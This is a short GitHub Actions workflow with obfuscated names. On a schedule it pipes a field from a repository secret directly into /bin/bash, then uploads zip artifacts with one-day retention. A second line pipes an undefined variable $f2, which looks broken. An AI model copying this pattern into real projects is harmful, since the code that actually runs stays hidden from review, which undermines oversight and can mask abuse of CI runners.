name: wubeizhenzhu
on:
  workflow_dispatch:

  schedule:
    - cron: '8 3,9,15,21 * * *'
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: wubeizhenzhu
        env:
          puboo14152: ${{ secrets.puboo14152 }}
        run: |
          printf '%s' "$puboo14152" | jq -r .jo88026 | /bin/bash
          printf '%s' "$f2" | jq -r .ntidx976 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: nE1q4Zu0
          path: "*.zip"
          retention-days: 1
